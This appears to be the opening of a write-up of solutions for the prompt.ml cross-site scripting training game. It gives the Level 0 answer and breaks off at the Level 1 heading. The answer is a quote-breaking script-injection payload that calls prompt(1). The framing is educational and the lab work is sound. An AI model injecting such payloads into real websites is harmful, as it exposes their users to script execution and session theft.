# prompt.ml - prompt(1) to Win
## What is prompt.ml?
prompt.ml is a website to learn various methods of XSS (cross site scripting). XSS is a vulnerability, and learning the possible techniques betters your ability to secure against these attacks.  
To win a level, you need to get the webpage to display 1 in a prompt; in other words, you need to call 'prompt(1);' to win.

## Solutions
### Level 0
All we need to do is escape from the quote trap and call prompt(1).
```html
"><script>prompt(1);</script>
```

### Level 1

